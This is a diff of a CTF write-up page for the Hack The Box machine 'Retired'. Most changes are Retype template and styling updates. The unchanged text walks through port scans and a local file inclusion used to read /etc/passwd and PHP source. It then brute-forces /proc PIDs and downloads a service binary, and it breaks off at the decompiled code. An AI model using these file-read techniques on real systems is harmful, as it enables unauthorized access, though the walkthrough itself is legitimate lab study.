@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769393205067">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.819170984352">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Retired</title>
@@ -30,52 +30,52 @@
     <meta property="twitter:description" content="IP: 10.10.11.154">
     <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/retired/images/retired.png">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.5.0.769393205067" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.819170984352" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.769393205067" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.819170984352" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
-                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">ctf-notes</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
-                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                         </g>
                                     </svg>
                                     <span>GitHub</span>
                                 </a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
                                             <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -96,7 +96,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -114,7 +114,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -124,26 +124,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
-                <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -153,23 +153,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
-                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                 </g>
                                             </svg>
                                             <span>GitHub</span>
                                         </a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
                                                     <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -183,7 +183,7 @@
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -191,14 +191,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="retired" class="break-words">
     <h1>
@@ -207,7 +207,7 @@
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/retired.png" alt="">
+    <img src="images/retired.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -225,7 +225,7 @@
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.154
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.154
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -238,7 +238,7 @@ PORT   STATE SERVICE
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 22,80 10.10.11.154 -o nmap.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 22,80 10.10.11.154 -o nmap.txt
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
@@ -265,7 +265,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 </doc-anchor-target>
 <p>Running gobuster we find some more pages:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">gobuster dir -u http://10.10.11.154 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x txt,html
+<pre translate="no" class="language-none"><code v-pre class="language-none">gobuster dir -u http://10.10.11.154 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x txt,html
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -290,7 +290,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 </doc-codeblock></div>
 <p>Accessing <a href="http://10.10.11.154/beta.html">http://10.10.11.154/beta.html</a> we are redirected to <a href="http://10.10.11.154/index.php?page=beta.html">http://10.10.11.154/index.php?page=beta.html</a>:
 <figure class="content-center">
-    <img src="images/image1.png" alt="">
+    <img src="images/image1.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -304,7 +304,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 <p>So it seems that <code v-pre>index.php</code> is loading html pages from the <code v-pre>?page=</code> parameter as we can see above. We can try to load some internal system files:
 <a href="http://10.10.11.154/index.php?page=/etc/passwd">http://10.10.11.154/index.php?page=/etc/passwd</a></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bash
+<pre translate="no" class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -336,7 +336,7 @@ dev:x:1001:1001::/home/dev:/bin/bash</code></pre>
 <p>To understand better how the website works lets see the <code v-pre>index.php</code> source-code:
 <code v-pre>/index.php?page=/var/www/html/index.php</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-php"><code v-pre class="language-php">&lt;?php
+<pre translate="no" class="language-php"><code v-pre class="language-php">&lt;?php
 function sanitize_input($param) {
     $param1 = str_replace(&quot;../&quot;,&quot;&quot;,$param);
     $param2 = str_replace(&quot;./&quot;,&quot;&quot;,$param1);
@@ -357,7 +357,7 @@ readfile($page);
 Now lets see how the <code v-pre>activate_license.php</code> file works when we press the &quot;SUBMIT&quot; button:
 <code v-pre>/index.php?page=/var/www/html/activate_license.php</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-php"><code v-pre class="language-php">&lt;?php
+<pre translate="no" class="language-php"><code v-pre class="language-php">&lt;?php
 if(isset($_FILES['licensefile'])) {
     $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
     $license_size = $_FILES['licensefile']['size'];
@@ -382,31 +382,31 @@ Since we have a LFI vulnerability we can bruteforce the directory <code v-pre>/p
 Using this technique we can find not only files and binaries running in the system but its memory address as well. I will use Burp Intruder module to do this task.
 We set the payload position like that:
 <figure class="content-center">
-    <img src="images/image5.png" alt="">
+    <img src="images/image5.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>And set the payload to sequential numbers like that:
 <figure class="content-center">
-    <img src="images/image6.png" alt="">
+    <img src="images/image6.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>So we will bruteforce PIDs from 1-500 and see if we get anything interesting:
 <figure class="content-center">
-    <img src="images/image7.png" alt="">
+    <img src="images/image7.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We found a <code v-pre>activate_license</code> binary running on PID 424.</p>
 <p>We can read the <code v-pre>/proc/424/cmdline</code> to check if the binary was started with arguments:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">/usr/bin/activate_license 1337</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">/usr/bin/activate_license 1337</code></pre>
 </doc-codeblock></div>
 <p>Yes, it seems to be the service running on port 1337 which receives the file we submit on the <code v-pre>beta.html</code> page.</p>
 <p>We can download the binary for local analysis:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.129.195.171/index.php?page=/usr/bin/activate_license -o activate_license</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl http://10.129.195.171/index.php?page=/usr/bin/activate_license -o activate_license</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="binary-analysis">
     <h3>
@@ -423,7 +423,7 @@ We set the payload position like that:
 <code v-pre>main()</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">main</div>
-<pre class="language-c"><code v-pre class="language-c">int main(int argc,char **argv)
+<pre translate="no" class="language-c"><code v-pre class="language-c">int main(int argc,char **argv)
 
 {
   int iVar1;
@@ -491,7 +491,7 @@ We set the payload position like that:
 </doc-codeblock></div>
 <p><code v-pre>activate_license()</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">void activate_license(int sockfd)
